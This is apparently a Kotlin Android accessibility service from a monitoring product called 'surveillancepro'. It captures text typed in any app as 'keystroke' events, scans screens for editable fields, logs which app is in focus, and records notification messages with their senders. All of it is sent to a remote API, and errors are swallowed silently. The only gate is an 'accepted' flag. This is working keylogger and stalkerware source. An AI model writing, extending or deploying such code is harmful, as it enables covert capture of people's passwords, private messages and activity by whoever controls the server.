package com.surveillancepro.android.services

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.surveillancepro.android.data.ApiClient
import com.surveillancepro.android.data.DeviceStorage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class SupervisionAccessibilityService : AccessibilityService() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var lastText = ""
    private var lastPackage = ""
    private var lastSendTime = 0L
    private var lastNotifText = ""

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val storage = DeviceStorage.getInstance(applicationContext)
        if (!storage.hasAccepted || storage.deviceToken == null) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> handleTextChanged(event, storage)
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> handleFocusChanged(event, storage)
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> handleNotification(event, storage)
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> handleContentChanged(event, storage)
            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> handleTextChanged(event, storage)
        }
    }

    private fun handleTextChanged(event: AccessibilityEvent, storage: DeviceStorage) {
        val text = event.text?.joinToString("") ?: return
        if (text.isBlank() || text == lastText) return
        if (text.length < 2) return

        val packageName = event.packageName?.toString() ?: "unknown"
        val now = System.currentTimeMillis()

        if (now - lastSendTime < 1500 && packageName == lastPackage && text.startsWith(lastText.take(5))) return

        lastText = text
        lastPackage = packageName
        lastSendTime = now

        val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())

        scope.launch {
            try {
                ApiClient.getInstance(storage).sendEvent("keystroke", mapOf(
                    "text" to text.take(1000),
                    "app" to packageName,
                    "fieldType" to (event.className?.toString() ?: ""),
                    "timestamp" to timestamp,
                ))
            } catch (_: Exception) {}
        }
    }

    private fun handleContentChanged(event: AccessibilityEvent, storage: DeviceStorage) {
        val packageName = event.packageName?.toString() ?: return
        val source = event.source ?: return

        try {
            val editTexts = mutableListOf<AccessibilityNodeInfo>()
            findEditTexts(source, editTexts)

            for (node in editTexts) {
                val text = node.text?.toString() ?: continue
                if (text.isBlank() || text == lastText || text.length < 2) continue

                val now = System.currentTimeMillis()
                if (now - lastSendTime < 1500) continue

                lastText = text
                lastSendTime = now

                val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())

                scope.launch {
                    try {
                        ApiClient.getInstance(storage).sendEvent("keystroke", mapOf(
                            "text" to text.take(1000),
                            "app" to packageName,
                            "timestamp" to timestamp,
                        ))
                    } catch (_: Exception) {}
                }
                break
            }
        } catch (_: Exception) {}
    }

    private fun findEditTexts(node: AccessibilityNodeInfo, results: MutableList<AccessibilityNodeInfo>) {
        if (node.className?.toString()?.contains("EditText") == true || node.isEditable) {
            results.add(node)
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            findEditTexts(child, results)
        }
    }

    private fun handleFocusChanged(event: AccessibilityEvent, storage: DeviceStorage) {
        val packageName = event.packageName?.toString() ?: return
        if (packageName == lastPackage) return
        lastPackage = packageName

        val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())

        scope.launch {
            try {
                ApiClient.getInstance(storage).sendEvent("app_focus", mapOf(
                    "app" to packageName,
                    "timestamp" to timestamp,
                ))
            } catch (_: Exception) {}
        }
    }

    private fun handleNotification(event: AccessibilityEvent, storage: DeviceStorage) {
        val packageName = event.packageName?.toString() ?: return
        val text = event.text?.joinToString(" ") ?: return
        if (text.isBlank() || text == lastNotifText) return
        lastNotifText = text

        val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())

        scope.launch {
            try {
                ApiClient.getInstance(storage).sendEvent("notification_message", mapOf(
                    "app" to packageName,
                    "message" to text.take(500),
                    "sender" to (event.contentDescription?.toString() ?: ""),
                    "timestamp" to timestamp,
                ))
            } catch (_: Exception) {}
        }
    }

    override fun onInterrupt() {}
}
